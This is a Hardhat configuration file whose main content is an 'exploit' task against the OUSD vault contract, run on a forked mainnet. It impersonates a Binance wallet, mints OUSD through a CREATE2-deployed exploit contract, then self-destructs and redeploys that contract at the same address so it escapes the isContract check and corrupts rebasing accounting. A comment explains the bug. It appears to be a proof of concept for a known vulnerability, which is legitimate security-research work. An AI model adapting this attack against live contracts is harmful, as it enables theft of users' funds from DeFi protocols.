require("@nomiclabs/hardhat-ethers");
require("hardhat-deploy");
require("hardhat-deploy-ethers");
const { utils } = require("ethers");

const vaultCoreABI = require("./abi/VaultCore.json");
const erc20ABI = require("./abi/ERC20.json");
const ousdABI = require("./abi/OUSD.json");

const binanceAddress = "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE";
const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f";
const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ousdAddress = "";

if (!process.env.PROVIDER_URL) {
  console.log("Set PROVIDER_URL in env");
  process.exit();
}

// Become a different account
const become = async (hre, address) => {
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [address],
  });
};

task("exploit", async (taskArguments, hre) => {
  await run("compile");

  const {deploy} = hre.deployments;
  const {deployer} = await hre.getNamedAccounts();

  const vaultAddress = "0xe75d77b1865ae93c7eaa3040b038d7aa7bc02f70";
  const vault = await ethers.getContractAt(vaultCoreABI, vaultAddress);
  const ousdAddress = "0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86";
  const ousd = await ethers.getContractAt(ousdABI, ousdAddress);

  await deploy("ExploitFactory", { from: deployer });
  const cExploitFactory = await ethers.getContract("ExploitFactory");

  const encodedFactoryAddress = utils.defaultAbiCoder
    .encode(["address"], [cExploitFactory.address])
    .slice(2);
  const initCode = (await ethers.getContractFactory("Exploit")).bytecode;
  const deployCode = `${initCode}${encodedFactoryAddress}`;

  // Deploy the exploit
  await cExploitFactory.deploy(12345, deployCode);
  let exploitAddress = await cExploitFactory.computeAddress(12345, deployCode);

  // Source funds
  await become(hre, binanceAddress);
  const signer = await hre.ethers.getSigner(binanceAddress);
  const dai = await hre.ethers.getContractAt(erc20ABI, daiAddress);
  console.log(
    "Transferring DAI",
    Number(await dai.balanceOf(binanceAddress)) / 1e18
  );
  await dai
    .connect(signer)
    .transfer(exploitAddress, await dai.balanceOf(binanceAddress));

  const cExploit = await ethers.getContractAt("Exploit", exploitAddress);
  // Mint a bunch of OUSD
  await cExploit.mint();

  /*
   * The address of the exploit contract now has a fixed rebasingCreditsPerToken
   * because it is a contract and has opted out of rebasing by default. When a
   * rebase is called the rebase will exclude its credits from the calculation of
   * the new rebasingCreditsPerToken value. We can redeploy it to the same address
   * using CREATE2 and because its in construction the Address.isContract library
   * will deem it not to be a contract.
   */

  // Selfdestruct
  await cExploit.bye();

  // Mint from another address to update rebasingCreditsPerToken incorrectly
  const usdt = await hre.ethers.getContractAt(erc20ABI, usdtAddress);
  await usdt.connect(signer).approve(vaultAddress, await usdt.balanceOf(binanceAddress));
  await vault.connect(signer).mint(usdtAddress, await usdt.balanceOf(binanceAddress), 0);

  // Redeploy contract to the same address, its constructor will call the attack
  // and it will transfer more than its balance reports
  await cExploitFactory.setShouldAttack(true);
  cExploitFactory.deploy("12345", deployCode);
  exploitAddress = await cExploitFactory.computeAddress(12345, deployCode);
});

module.exports = {
  solidity: "0.5.11",
  networks: {
    hardhat: {
      forking: {
        url: process.env.PROVIDER_URL, 
        blockNumber: 11599000
      },
    },
  },
  namedAccounts: {
    deployer: {
      default: 0,
    },
  },

};
